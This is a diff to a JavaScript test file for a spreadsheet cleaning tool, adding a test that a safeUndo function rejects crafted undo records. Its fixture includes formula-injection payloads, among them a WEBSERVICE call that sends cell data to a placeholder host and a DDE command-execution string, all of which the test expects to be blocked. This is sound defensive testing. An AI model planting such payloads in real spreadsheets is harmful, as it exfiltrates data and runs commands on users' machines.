@@ -5,7 +5,7 @@ import { cutNote, tableFromGrid, isDateFormat, excelDate, rowFromAddress, colLet
 import { issuesOf, recommendFix, typoKind, spansDecade, afterFix, unusualColumn } from "./features/fix.js";
 import { plainReason, summaryOf, flaggedRows, fairnessNote, fairnessTests } from "./features/scan.js";
 import { strengthHint, asStrength, levelAt } from "./pages/strength.js";
-import { exactFixes } from "./features/autofix.js";
+import { exactFixes, safeUndo } from "./features/autofix.js";
 
 // fairness line: protected columns named; a real gap spelled out; nothing at all without a protected column
 assert.equal(fairnessNote({ protected: {}, tests: [] }), "");
@@ -75,6 +75,12 @@ assert.deepEqual(mr.changes, [{ cell: "A2", new: "Pencil" }]);
 assert.ok(mr.guess && mr.explanation.includes("misspelling"));
 
 // auto-fix: only the engine's exact fixes, on known columns; text must match exactly for Undo
+// undo auto-fixes never types a formula or writes off-grid, whatever the workbook's stored undo says (2026-10-15
+// audit: a crafted .xlsx could carry its own undo record); real auto-fix records hold only plain text
+assert.deepEqual(safeUndo([{ cell: "B3", old: "east " }, { cell: "Z1", old: '=WEBSERVICE("https://x/?"&A2)' },
+  { cell: "B4", old: "＝1+1" }, { cell: "B5", old: "@SUM(1)" }, { cell: "B6", old: "+cmd|'/c calc'!A0" },
+  { cell: "B7", old: -5 }, { cell: "B8", old: "-5" }, { cell: "Sheet2!A1", old: "x" }, { cell: "B9", old: null },
+  { cell: "B10", old: "-west" }]).map((w) => w.cell), ["B3", "B7", "B8", "B9"]);
 assert.deepEqual(exactFixes([{ exact: { Region: "East" } }, null, { severity: "Low", likely: { Units: 5 } }, { exact: { Nope: "x" } }], ["Date", "Region"]),
   [{ k: 0, j: 1, value: "East" }]);
 
